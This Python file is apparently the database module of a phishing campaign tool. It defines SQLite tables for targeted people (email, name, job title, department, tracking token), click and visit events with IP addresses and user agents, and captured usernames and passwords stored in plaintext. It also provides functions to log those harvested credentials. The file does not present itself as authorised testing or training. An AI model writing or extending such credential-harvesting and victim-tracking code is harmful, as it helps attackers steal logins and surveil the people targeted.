#!/usr/bin/env python3
"""
Database operations for phishing campaign
"""

import sqlite3
from typing import Optional, List, Tuple, Dict, Any

class Database:
    """Handle all database operations"""
    
    def __init__(self, db_path='phishing_campaign.db'):
        self.db_path = db_path
        self.conn = self._init_database()
    
    def _init_database(self):
        """Initialize database with required tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Targets table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY,
                email TEXT UNIQUE,
                name TEXT,
                title TEXT,
                department TEXT,
                token TEXT UNIQUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Events table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS events (
                id INTEGER PRIMARY KEY,
                target_id INTEGER,
                event_type TEXT,
                ip_address TEXT,
                user_agent TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (target_id) REFERENCES targets(id)
            )
        ''')
        
        # Credentials table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY,
                target_id INTEGER,
                username TEXT,
                password TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (target_id) REFERENCES targets(id)
            )
        ''')
        
        conn.commit()
        return conn
    
    def add_target(self, email: str, name: str, title: str = "", 
                   department: str = "", token: str = "") -> str:
        """Add target to database"""
        cursor = self.conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO targets (email, name, title, department, token)
                VALUES (?, ?, ?, ?, ?)
            ''', (email, name, title, department, token))
            self.conn.commit()
            return token
        except sqlite3.IntegrityError:
            # Email already exists, retrieve existing token
            cursor.execute('SELECT token FROM targets WHERE email = ?', (email,))
            result = cursor.fetchone()
            return result[0] if result else ""
    
    def get_target_by_token(self, token: str) -> Optional[int]:
        """Get target ID by token"""
        cursor = self.conn.cursor()
        cursor.execute('SELECT id FROM targets WHERE token = ?', (token,))
        result = cursor.fetchone()
        return result[0] if result else None
    
    def log_event(self, target_id: int, event_type: str, 
                  ip_address: str = "", user_agent: str = "") -> bool:
        """Log tracking event"""
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO events (target_id, event_type, ip_address, user_agent)
            VALUES (?, ?, ?, ?)
        ''', (target_id, event_type, ip_address, user_agent))
        self.conn.commit()
        return True
    
    def log_credentials(self, target_id: int, username: str, password: str) -> bool:
        """Log captured credentials"""
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO credentials (target_id, username, password)
            VALUES (?, ?, ?)
        ''', (target_id, username, password))
        self.conn.commit()
        return True
    
    def get_all_targets(self) -> List[Tuple]:
        """Get all targets"""
        cursor = self.conn.cursor()
        cursor.execute('SELECT email, name, token FROM targets')
        return cursor.fetchall()
    
    def close(self):
        """Close database connection"""
        self.conn.close()